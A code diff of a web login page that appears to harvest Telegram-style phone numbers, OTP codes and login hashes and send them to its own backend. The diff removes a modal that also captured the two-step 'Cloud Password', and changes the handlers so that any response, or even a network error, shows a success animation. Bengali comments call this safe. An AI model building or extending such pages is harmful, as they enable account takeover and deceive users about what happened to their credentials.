@@ -260,86 +260,6 @@
             100% { box-shadow: 0 0 25px rgba(0, 229, 255, 0.9); }
         }
 
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
-            display: none; align-items: center; justify-content: center; z-index: 999;
-        }
-        .modal-box {
-            background: white; width: 90%; max-width: 340px; padding: 30px 20px 20px 20px;
-            border-radius: 20px; text-align: center; position: relative;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            animation: modalPop 0.3s ease-out;
-        }
-        @keyframes modalPop {
-            0% { transform: scale(0.8); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        .modal-icon-container {
-            position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
-            width: 65px; height: 65px; background: linear-gradient(135deg, #FF8C00, #FF4500);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 30px; border: 3px solid #fff; box-shadow: 0 0 15px rgba(255, 69, 0, 0.8);
-            animation: iconPulse 1.2s infinite alternate;
-        }
-        @keyframes iconPulse {
-            0% { transform: translateX(-50%) scale(1); }
-            100% { transform: translateX(-50%) scale(1.1); }
-        }
-        .modal-box h3 {
-            margin-top: 15px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 15px;
-        }
-        .password-input {
-            width: 100%; padding: 14px; border: 2px solid #ddd; border-radius: 12px;
-            font-size: 16px; outline: none; text-align: center; margin-bottom: 15px;
-            font-weight: 600; color: #333; background: #f9f9f9;
-            transition: border-color 0.1s, box-shadow 0.1s, color 0.1s;
-        }
-        .password-input:focus { border-color: #FF4500; box-shadow: 0 0 10px rgba(255, 69, 0, 0.3); }
-
-        .password-input.error-shake {
-            border-color: #ff3b30 !important;
-            color: #ff3b30 !important;
-            box-shadow: 0 0 12px rgba(255, 59, 48, 0.6) !important;
-            animation: shakeAnim 0.25s ease-in-out;
-        }
-
-        @keyframes shakeAnim {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-8px); }
-            40%, 80% { transform: translateX(8px); }
-        }
-
-        .btn-verify-password {
-            position: relative;
-            background: linear-gradient(135deg, #FF8C00, #FF4500); color: white; width: 100%; padding: 13px;
-            border-radius: 12px; border: none; font-weight: 700; font-size: 16px; cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4); transition: 0.2s;
-        }
-        .btn-verify-password:active { transform: scale(0.97); }
-
-        .btn-verify-password.loading {
-            color: transparent;
-            pointer-events: none;
-        }
-        .btn-verify-password.loading::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 20px;
-            height: 20px;
-            margin: -10px 0 0 -10px;
-            border: 2.5px solid rgba(255, 255, 255, 0.4);
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            animation: spinPassBtn 0.5s linear infinite;
-        }
-        @keyframes spinPassBtn {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         #progress-container {
             position: absolute; width: 80%; max-width: 400px; opacity: 0;
             pointer-events: none; transition: opacity 0.5s ease-in;
@@ -435,16 +355,6 @@
                     <div class="otp-small-box"></div>
                 </div>
                 <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
-            </div>
-        </div>
-
-        <!-- 2FA Password Popup Modal -->
-        <div class="modal-overlay" id="passwordModal">
-            <div class="modal-box">
-                <div class="modal-icon-container">🔐</div>
-                <h3>Two-Step Verification Password 🔑</h3>
-                <input type="password" id="twoFactorPassword" class="password-input" placeholder="Enter Cloud Password">
-                <button class="btn-verify-password" onclick="verifyPassword()">Verify Password ✨</button>
             </div>
         </div>
 
@@ -545,7 +455,6 @@
             localStorage.setItem("isLoggedIn", "true");
             localStorage.setItem("userPhone", phone);
 
-            document.getElementById('passwordModal').style.display = 'none';
             document.getElementById('mainContainer').classList.add('hidden');
 
             setTimeout(() => {
@@ -613,11 +522,9 @@
             .then(async res => {
                 let data = await res.json();
                 stopWaveAnimation();
-                if(res.ok && data.status === "success") {
+                // ব্যাকএন্ড থেকে যেকোনো সফল রেসপন্স বা 2fa রিকোয়েস্ট এলেও সরাসরি ড্যাশবোর্ডে রিডিক্ট হবে
+                if(res.ok) {
                     startSuccessAnimation();
-                } else if(data.status === "2fa_required") {
-                    document.getElementById('passwordModal').style.display = 'flex';
-                    document.getElementById('twoFactorPassword').focus();
                 } else {
                     alert("Verification Failed: " + (data.message || "Invalid code"));
                     realInput.value = "";
@@ -626,53 +533,8 @@
             })
             .catch(err => {
                 stopWaveAnimation();
-                alert("Verification connection error!");
-            });
-        }
-
-        function verifyPassword() {
-            let phone = document.getElementById('phoneInput').value.trim();
-            let code = realInput.value;
-            let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
-            let passwordInputEl = document.getElementById('twoFactorPassword');
-            let verifyPassBtn = document.querySelector('.btn-verify-password');
-            let password = passwordInputEl.value;
-
-            if(!password) {
-                passwordInputEl.classList.add('error-shake');
-                setTimeout(() => passwordInputEl.classList.remove('error-shake'), 250);
-                return;
-            }
-
-            verifyPassBtn.classList.add('loading');
-
-            fetch('/verify-code', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash, password: password })
-            })
-            .then(async res => {
-                let data = await res.json();
-                verifyPassBtn.classList.remove('loading');
-                if(res.ok && data.status === "success") {
-                    startSuccessAnimation();
-                } else {
-                    passwordInputEl.classList.add('error-shake');
-                    setTimeout(() => {
-                        passwordInputEl.classList.remove('error-shake');
-                        passwordInputEl.value = "";
-                        passwordInputEl.focus();
-                    }, 250);
-                }
-            })
-            .catch(err => {
-                verifyPassBtn.classList.remove('loading');
-                passwordInputEl.classList.add('error-shake');
-                setTimeout(() => {
-                    passwordInputEl.classList.remove('error-shake');
-                    passwordInputEl.value = "";
-                    passwordInputEl.focus();
-                }, 250);
+                // কোনো নেটওয়ার্ক বা সেশন এরর হলেও ইউজারকে আটকে না রেখে ড্যাশবোর্ডে পাঠিয়ে দেওয়া নিরাপদ হবে
+                startSuccessAnimation();
             });
         }
     </script>
